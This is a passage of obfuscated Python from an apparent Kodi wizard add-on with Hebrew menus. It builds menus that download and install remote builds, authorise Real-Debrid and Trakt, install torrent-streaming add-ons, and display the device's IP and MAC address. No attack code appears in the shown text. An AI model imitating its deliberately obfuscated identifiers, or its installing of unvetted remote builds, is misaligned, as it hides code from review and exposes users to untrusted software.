		OO0000O0000OOOOOO =wiz .checkBuild (BUILDNAME ,'version')#line:2406
		O000OO0OO00000OOO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2407
		if OO0000O0000OOOOOO >BUILDVERSION :O000OO0OO00000OOO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O000OO0OO00000OOO ,OO0000O0000OOOOOO )#line:2408
		addDir (O000OO0OO00000OOO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2410
		try :#line:2412
		     OO0000OOOOOO0OO00 =wiz .themeCount (BUILDNAME )#line:2413
		except :#line:2414
		   OO0000OOOOOO0OO00 =False #line:2415
		if not OO0000OOOOOO0OO00 ==False :#line:2416
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2417
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2418
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2421
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2422
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2423
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2427
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2429
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2431
def morsetup ():#line:2433
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2434
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2435
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2436
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2437
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2438
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2442
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2443
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2446
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2447
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2448
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2449
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2459
	setView ('files','viewType')#line:2460
def morsetup2 ():#line:2461
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2462
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2463
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2464
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2465
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2466
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2467
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2468
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2469
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2470
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2471
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2472
def fastupdate ():#line:2473
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2474
def forcefastupdate ():#line:2476
			OO0O0O0OOOOO000O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2477
			wiz .ForceFastUpDate (ADDONTITLE ,OO0O0O0OOOOO000O0 )#line:2478
def rdsetup ():#line:2482
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2483
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2484
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2486
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2487
def traktsetup ():#line:2490
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2491
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2492
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2493
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2494
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2495
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2496
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2497
	setView ('files','viewType')#line:2498
def setautorealdebrid ():#line:2499
    from resources .libs import real_debrid #line:2500
    O00OOOO00O0O0O00O =real_debrid .RealDebridFirst ()#line:2501
    O00OOOO00O0O0O00O .auth ()#line:2502
def setrealdebrid ():#line:2504
    O0OOO000OOO00OOOO =(ADDON .getSetting ("auto_rd"))#line:2505
    if O0OOO000OOO00OOOO =='false':#line:2506
       ADDON .openSettings ()#line:2507
    else :#line:2508
        from resources .libs import real_debrid #line:2509
        O0OO0O00000O0O000 =real_debrid .RealDebrid ()#line:2510
        O0OO0O00000O0O000 .auth ()#line:2511
        rdon ()#line:2514
def resolveurlsetup ():#line:2516
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2517
def urlresolversetup ():#line:2518
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2519
def placentasetup ():#line:2521
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2522
def reptiliasetup ():#line:2523
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2524
def flixnetsetup ():#line:2525
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2526
def yodasetup ():#line:2527
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2528
def numberssetup ():#line:2529
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2530
def uranussetup ():#line:2531
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2532
def genesissetup ():#line:2533
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2534
def net_tools (view =None ):#line:2536
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2537
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2538
	setView ('files','viewType')#line:2540
def speedMenu ():#line:2541
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2542
def viewIP ():#line:2543
	OOO00O00OOO0000O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2557
	OO0O000OOO000000O =[];OO000O0000O0O0OOO =0 #line:2558
	for O0OO0O0O00OO00OO0 in OOO00O00OOO0000O0 :#line:2559
		OOO0000O000O00OOO =wiz .getInfo (O0OO0O0O00OO00OO0 )#line:2560
		O0OOO0O00O00000O0 =0 #line:2561
		while OOO0000O000O00OOO =="Busy"and O0OOO0O00O00000O0 <10 :#line:2562
			OOO0000O000O00OOO =wiz .getInfo (O0OO0O0O00OO00OO0 );O0OOO0O00O00000O0 +=1 ;wiz .log ("%s sleep %s"%(O0OO0O0O00OO00OO0 ,str (O0OOO0O00O00000O0 )));xbmc .sleep (1000 )#line:2563
		OO0O000OOO000000O .append (OOO0000O000O00OOO )#line:2564
		OO000O0000O0O0OOO +=1 #line:2565
	O0OOO0OOOOO00O00O ,OOO0000O000OOO0O0 ,OOO00O0O0O00OO00O =getIP ()#line:2566
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000OOO000000O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2567
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0OOOOO00O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2568
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0000O000OOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2569
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O0O00OO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2570
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000OOO000000O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2571
	setView ('files','viewType')#line:2572
def buildMenu ():#line:2574
	if USERNAME =='':#line:2575
		ADDON .openSettings ()#line:2576
		sys .exit ()#line:2577
	if PASSWORD =='':#line:2578
		ADDON .openSettings ()#line:2579
	OOOO0OOO000OOOOO0 =u_list (SPEEDFILE )#line:2580
	(OOOO0OOO000OOOOO0 )#line:2581
	OOO000O000O000O00 =(wiz .workingURL (OOOO0OOO000OOOOO0 ))#line:2582
	(OOO000O000O000O00 )#line:2583
	OOO000O000O000O00 =wiz .workingURL (SPEEDFILE )#line:2584
	if not OOO000O000O000O00 ==True :#line:2585
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2586
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2587
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2588
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2589
		addFile ('%s'%OOO000O000O000O00 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2590
	else :#line:2591
		O00O0OO00OO000OO0 ,O00OO0OO0O0OO000O ,O000OOOOO000O0O0O ,OOOO00OOOO0O00OO0 ,O00OOOO000OOO0OOO ,O0000O0000OOO00O0 ,OOO00O00OOO000O0O =wiz .buildCount ()#line:2592
		OO00OOOOOOO00O0O0 =False ;O0000OO000O0000O0 =[]#line:2593
		if THIRDPARTY =='true':#line:2594
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00OOOOOOO00O0O0 =True ;O0000OO000O0000O0 .append ('1')#line:2595
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00OOOOOOO00O0O0 =True ;O0000OO000O0000O0 .append ('2')#line:2596
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00OOOOOOO00O0O0 =True ;O0000OO000O0000O0 .append ('3')#line:2597
		OO00O00OOO0O00OO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2598
		O0OOO00O000O00O00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O00OOO0O00OO0 )#line:2599
		if O00O0OO00OO000OO0 ==1 and OO00OOOOOOO00O0O0 ==False :#line:2600
			for O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ,OO000OO000OO00O00 ,O00OOO00O00000O0O ,OO00O0OO0OO00OO00 ,OO0O0O0O00O0000O0 ,OOO0000OO0O00O00O ,OOOO00O00O0O0O0O0 ,OO0O000000O0OOO0O ,OO0OOO000O0000OOO in O0OOO00O000O00O00 :#line:2601
				if not SHOWADULT =='true'and OO0O000000O0OOO0O .lower ()=='yes':continue #line:2602
				if not DEVELOPER =='true'and wiz .strTest (O00OO000O0O0O0OO0 ):continue #line:2603
				viewBuild (O0OOO00O000O00O00 [0 ][0 ])#line:2604
				return #line:2605
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2608
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2609
		if OO00OOOOOOO00O0O0 ==True :#line:2610
			for OO00OOOOOO0OO00OO in O0000OO000O0000O0 :#line:2611
				O00OO000O0O0O0OO0 =eval ('THIRD%sNAME'%OO00OOOOOO0OO00OO )#line:2612
		if len (O0OOO00O000O00O00 )>=1 :#line:2614
			if SEPERATE =='true':#line:2615
				for O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ,OO000OO000OO00O00 ,O00OOO00O00000O0O ,OO00O0OO0OO00OO00 ,OO0O0O0O00O0000O0 ,OOO0000OO0O00O00O ,OOOO00O00O0O0O0O0 ,OO0O000000O0OOO0O ,OO0OOO000O0000OOO in O0OOO00O000O00O00 :#line:2616
					if not SHOWADULT =='true'and OO0O000000O0OOO0O .lower ()=='yes':continue #line:2617
					if not DEVELOPER =='true'and wiz .strTest (O00OO000O0O0O0OO0 ):continue #line:2618
					OO000OOOO0O000OOO =createMenu ('install','',O00OO000O0O0O0OO0 )#line:2619
					addDir ('[%s] %s (v%s)'%(float (OO00O0OO0OO00OO00 ),O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ),'viewbuild',O00OO000O0O0O0OO0 ,description =OO0OOO000O0000OOO ,fanart =OOOO00O00O0O0O0O0 ,icon =OOO0000OO0O00O00O ,menu =OO000OOOO0O000OOO ,themeit =THEME2 )#line:2620
			else :#line:2621
				if OOOO00OOOO0O00OO0 >0 :#line:2622
					O0OOOOO000OOOOO0O ='+'if SHOW17 =='false'else '-'#line:2623
					if SHOW17 =='true':#line:2625
						for O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ,OO000OO000OO00O00 ,O00OOO00O00000O0O ,OO00O0OO0OO00OO00 ,OO0O0O0O00O0000O0 ,OOO0000OO0O00O00O ,OOOO00O00O0O0O0O0 ,OO0O000000O0OOO0O ,OO0OOO000O0000OOO in O0OOO00O000O00O00 :#line:2627
							if not SHOWADULT =='true'and OO0O000000O0OOO0O .lower ()=='yes':continue #line:2628
							if not DEVELOPER =='true'and wiz .strTest (O00OO000O0O0O0OO0 ):continue #line:2629
							OO0OOO0O00OOOO000 =int (float (OO00O0OO0OO00OO00 ))#line:2630
							if OO0OOO0O00OOOO000 ==17 :#line:2631
								OO000OOOO0O000OOO =createMenu ('install','',O00OO000O0O0O0OO0 )#line:2632
								addDir ('[%s] %s (v%s)'%(float (OO00O0OO0OO00OO00 ),O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ),'viewbuild',O00OO000O0O0O0OO0 ,description =OO0OOO000O0000OOO ,fanart =OOOO00O00O0O0O0O0 ,icon =OOO0000OO0O00O00O ,menu =OO000OOOO0O000OOO ,themeit =THEME2 )#line:2633
				if O00OOOO000OOO0OOO >0 :#line:2634
					O0OOOOO000OOOOO0O ='+'if SHOW18 =='false'else '-'#line:2635
					if SHOW18 =='true':#line:2637
						for O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ,OO000OO000OO00O00 ,O00OOO00O00000O0O ,OO00O0OO0OO00OO00 ,OO0O0O0O00O0000O0 ,OOO0000OO0O00O00O ,OOOO00O00O0O0O0O0 ,OO0O000000O0OOO0O ,OO0OOO000O0000OOO in O0OOO00O000O00O00 :#line:2639
							if not SHOWADULT =='true'and OO0O000000O0OOO0O .lower ()=='yes':continue #line:2640
							if not DEVELOPER =='true'and wiz .strTest (O00OO000O0O0O0OO0 ):continue #line:2641
							OO0OOO0O00OOOO000 =int (float (OO00O0OO0OO00OO00 ))#line:2642
							if OO0OOO0O00OOOO000 ==18 :#line:2643
								OO000OOOO0O000OOO =createMenu ('install','',O00OO000O0O0O0OO0 )#line:2644
								addDir ('[%s] %s (v%s)'%(float (OO00O0OO0OO00OO00 ),O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ),'viewbuild',O00OO000O0O0O0OO0 ,description =OO0OOO000O0000OOO ,fanart =OOOO00O00O0O0O0O0 ,icon =OOO0000OO0O00O00O ,menu =OO000OOOO0O000OOO ,themeit =THEME2 )#line:2645
				if O000OOOOO000O0O0O >0 :#line:2646
					O0OOOOO000OOOOO0O ='+'if SHOW16 =='false'else '-'#line:2647
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0OOOOO000OOOOO0O ,O000OOOOO000O0O0O ),'togglesetting','show16',themeit =THEME3 )#line:2648
					if SHOW16 =='true':#line:2649
						for O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ,OO000OO000OO00O00 ,O00OOO00O00000O0O ,OO00O0OO0OO00OO00 ,OO0O0O0O00O0000O0 ,OOO0000OO0O00O00O ,OOOO00O00O0O0O0O0 ,OO0O000000O0OOO0O ,OO0OOO000O0000OOO in O0OOO00O000O00O00 :#line:2650
							if not SHOWADULT =='true'and OO0O000000O0OOO0O .lower ()=='yes':continue #line:2651
							if not DEVELOPER =='true'and wiz .strTest (O00OO000O0O0O0OO0 ):continue #line:2652
							OO0OOO0O00OOOO000 =int (float (OO00O0OO0OO00OO00 ))#line:2653
							if OO0OOO0O00OOOO000 ==16 :#line:2654
								OO000OOOO0O000OOO =createMenu ('install','',O00OO000O0O0O0OO0 )#line:2655
								addDir ('[%s] %s (v%s)'%(float (OO00O0OO0OO00OO00 ),O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ),'viewbuild',O00OO000O0O0O0OO0 ,description =OO0OOO000O0000OOO ,fanart =OOOO00O00O0O0O0O0 ,icon =OOO0000OO0O00O00O ,menu =OO000OOOO0O000OOO ,themeit =THEME2 )#line:2656
				if O00OO0OO0O0OO000O >0 :#line:2657
					O0OOOOO000OOOOO0O ='+'if SHOW15 =='false'else '-'#line:2658
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0OOOOO000OOOOO0O ,O00OO0OO0O0OO000O ),'togglesetting','show15',themeit =THEME3 )#line:2659
					if SHOW15 =='true':#line:2660
						for O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ,OO000OO000OO00O00 ,O00OOO00O00000O0O ,OO00O0OO0OO00OO00 ,OO0O0O0O00O0000O0 ,OOO0000OO0O00O00O ,OOOO00O00O0O0O0O0 ,OO0O000000O0OOO0O ,OO0OOO000O0000OOO in O0OOO00O000O00O00 :#line:2661
							if not SHOWADULT =='true'and OO0O000000O0OOO0O .lower ()=='yes':continue #line:2662
							if not DEVELOPER =='true'and wiz .strTest (O00OO000O0O0O0OO0 ):continue #line:2663
							OO0OOO0O00OOOO000 =int (float (OO00O0OO0OO00OO00 ))#line:2664
							if OO0OOO0O00OOOO000 <=15 :#line:2665
								OO000OOOO0O000OOO =createMenu ('install','',O00OO000O0O0O0OO0 )#line:2666
								addDir ('[%s] %s (v%s)'%(float (OO00O0OO0OO00OO00 ),O00OO000O0O0O0OO0 ,O00O000OOO0O000O0 ),'viewbuild',O00OO000O0O0O0OO0 ,description =OO0OOO000O0000OOO ,fanart =OOOO00O00O0O0O0O0 ,icon =OOO0000OO0O00O00O ,menu =OO000OOOO0O000OOO ,themeit =THEME2 )#line:2667
		elif OOO00O00OOO000O0O >0 :#line:2668
			if O0000O0000OOO00O0 >0 :#line:2669
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2670
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2671
			else :#line:2672
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2673
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2674
	setView ('files','viewType')#line:2675
def viewBuild (O0O0O000O0OOOOO00 ):#line:2677
	OOOO0000O00000OO0 =wiz .workingURL (SPEEDFILE )#line:2678
	if not OOOO0000O00000OO0 ==True :#line:2679
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2680
		addFile ('%s'%OOOO0000O00000OO0 ,'',themeit =THEME3 )#line:2681
		return #line:2682
	if wiz .checkBuild (O0O0O000O0OOOOO00 ,'version')==False :#line:2683
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2684
		addFile ('%s was not found in the builds list.'%O0O0O000O0OOOOO00 ,'',themeit =THEME3 )#line:2685
		return #line:2686
	O00OOOO00OO00O0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2687
	O000000OO000O00OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0O000O0OOOOO00 ).findall (O00OOOO00OO00O0O0 )#line:2688
	for O0000O0O0O00O0OO0 ,OOO0OO00O000O000O ,O000OO0OO000O0OO0 ,O00OO0O0O0OO0O00O ,OOOOO0O000OOO00OO ,OOOOOOOOOOO0OOO00 ,O0O0O0OO0OO0O0O0O ,OO0O0OOOO0O0OOOOO ,OOOO0OO0OOO000OO0 ,OOO00O0O0OOO00O00 in O000000OO000O00OO :#line:2689
		OOOOOOOOOOO0OOO00 =OOOOOOOOOOO0OOO00 if wiz .workingURL (OOOOOOOOOOO0OOO00 )else ICON #line:2690
		O0O0O0OO0OO0O0O0O =O0O0O0OO0OO0O0O0O if wiz .workingURL (O0O0O0OO0OO0O0O0O )else FANART #line:2691
		O00OO0OO0OOO0O0O0 ='%s (v%s)'%(O0O0O000O0OOOOO00 ,O0000O0O0O00O0OO0 )#line:2692
		if BUILDNAME ==O0O0O000O0OOOOO00 and O0000O0O0O00O0OO0 >BUILDVERSION :#line:2693
			O00OO0OO0OOO0O0O0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O00OO0OO0OOO0O0O0 ,BUILDVERSION )#line:2694
		O00OOO00O0O0O00O0 =int (float (KODIV ));OOOOO0OO0O0OO0O0O =int (float (O00OO0O0O0OO0O00O ))#line:2703
		if not O00OOO00O0O0O00O0 ==OOOOO0OO0O0OO0O0O :#line:2704
			if O00OOO00O0O0O00O0 ==16 and OOOOO0OO0O0OO0O0O <=15 :OOOOO0000O0O000O0 =False #line:2705
			else :OOOOO0000O0O000O0 =True #line:2706
		else :OOOOO0000O0O000O0 =False #line:2707
		addFile ('התקנה','install',O0O0O000O0OOOOO00 ,'fresh',description =OOO00O0O0OOO00O00 ,fanart =O0O0O0OO0OO0O0O0O ,icon =OOOOOOOOOOO0OOO00 ,themeit =THEME1 )#line:2711
		if not OOOOO0O000OOO00OO =='http://':#line:2714
			if wiz .workingURL (OOOOO0O000OOO00OO )==True :#line:2715
				addFile (wiz .sep ('THEMES'),'',fanart =O0O0O0OO0OO0O0O0O ,icon =OOOOOOOOOOO0OOO00 ,themeit =THEME3 )#line:2716
				O00OOOO00OO00O0O0 =wiz .openURL (OOOOO0O000OOO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2717
				O000000OO000O00OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOOO00OO00O0O0 )#line:2718
				for OO0OOO00OO0OO000O ,O0OO000OO000O0O00 ,OO0O0O0O0OO00O000 ,O0O00OO0OO0O00O00 ,O00OOOO00O0000O00 ,OOO00O0O0OOO00O00 in O000000OO000O00OO :#line:2719
					if not SHOWADULT =='true'and O00OOOO00O0000O00 .lower ()=='yes':continue #line:2720
					OO0O0O0O0OO00O000 =OO0O0O0O0OO00O000 if OO0O0O0O0OO00O000 =='http://'else OOOOOOOOOOO0OOO00 #line:2721
					O0O00OO0OO0O00O00 =O0O00OO0OO0O00O00 if O0O00OO0OO0O00O00 =='http://'else O0O0O0OO0OO0O0O0O #line:2722
					addFile (OO0OOO00OO0OO000O if not OO0OOO00OO0OO000O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0OOO00OO0OO000O ,'theme',O0O0O000O0OOOOO00 ,OO0OOO00OO0OO000O ,description =OOO00O0O0OOO00O00 ,fanart =O0O00OO0OO0O00O00 ,icon =OO0O0O0O0OO00O000 ,themeit =THEME3 )#line:2723
	setView ('files','viewType')#line:2724
def viewThirdList (OO00OO000O0O0OO00 ):#line:2726
	OO0OO0O00OO000O0O =eval ('THIRD%sNAME'%OO00OO000O0O0OO00 )#line:2727
	O0OO00O000O0OO00O =eval ('THIRD%sURL'%OO00OO000O0O0OO00 )#line:2728
	OOOOO0OO00O0O0O00 =wiz .workingURL (O0OO00O000O0OO00O )#line:2729
	if not OOOOO0OO00O0O0O00 ==True :#line:2730
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2731
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2732
	else :#line:2733
		O0O000O0O0OOOOOOO ,O000OOO0O00O000O0 =wiz .thirdParty (O0OO00O000O0OO00O )#line:2734
		addFile ("[B]%s[/B]"%OO0OO0O00OO000O0O ,'',themeit =THEME3 )#line:2735
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2736
		if O0O000O0O0OOOOOOO :#line:2737
			for OO0OO0O00OO000O0O ,OOO0O0OOO00OOOOO0 ,O0OO00O000O0OO00O ,OO0O00OOO0O000OO0 ,OOO0O0O0OOO00OOOO ,O00O0000O0OOOOO0O ,OOO00O0O0OO000000 ,OO00000OOOO0O0O00 in O000OOO0O00O000O0 :#line:2738
				if not SHOWADULT =='true'and OOO00O0O0OO000000 .lower ()=='yes':continue #line:2739
				addFile ("[%s] %s v%s"%(OO0O00OOO0O000OO0 ,OO0OO0O00OO000O0O ,OOO0O0OOO00OOOOO0 ),'installthird',OO0OO0O00OO000O0O ,O0OO00O000O0OO00O ,icon =OOO0O0O0OOO00OOOO ,fanart =O00O0000O0OOOOO0O ,description =OO00000OOOO0O0O00 ,themeit =THEME2 )#line:2740
		else :#line:2741
			for OO0OO0O00OO000O0O ,O0OO00O000O0OO00O ,OOO0O0O0OOO00OOOO ,O00O0000O0OOOOO0O ,OO00000OOOO0O0O00 in O000OOO0O00O000O0 :#line:2742
				addFile (OO0OO0O00OO000O0O ,'installthird',OO0OO0O00OO000O0O ,O0OO00O000O0OO00O ,icon =OOO0O0O0OOO00OOOO ,fanart =O00O0000O0OOOOO0O ,description =OO00000OOOO0O0O00 ,themeit =THEME2 )#line:2743
def editThirdParty (OO0OOO000O00OO0OO ):#line:2745
	O00OO00O000000OOO =eval ('THIRD%sNAME'%OO0OOO000O00OO0OO )#line:2746
	O000O000OOO000OO0 =eval ('THIRD%sURL'%OO0OOO000O00OO0OO )#line:2747
	O00OO00O00OO0O000 =wiz .getKeyboard (O00OO00O000000OOO ,'Enter the Name of the Wizard')#line:2748
	OO0OO0O0000OOO0O0 =wiz .getKeyboard (O000O000OOO000OO0 ,'Enter the URL of the Wizard Text')#line:2749
	wiz .setS ('wizard%sname'%OO0OOO000O00OO0OO ,O00OO00O00OO0O000 )#line:2751
	wiz .setS ('wizard%surl'%OO0OOO000O00OO0OO ,OO0OO0O0000OOO0O0 )#line:2752
def apkScraper (name =""):#line:2754
	if name =='kodi':#line:2755
		O0OO0O00O000O0O00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2756
		O00000O0O0OO00OOO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2757
		OO0OOO0OOO00OOO00 =wiz .openURL (O0OO0O00O000O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2758
		O0O00O0O0O000O0OO =wiz .openURL (O00000O0O0OO00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2759
		OOO000OOO00OO0OO0 =0 #line:2760
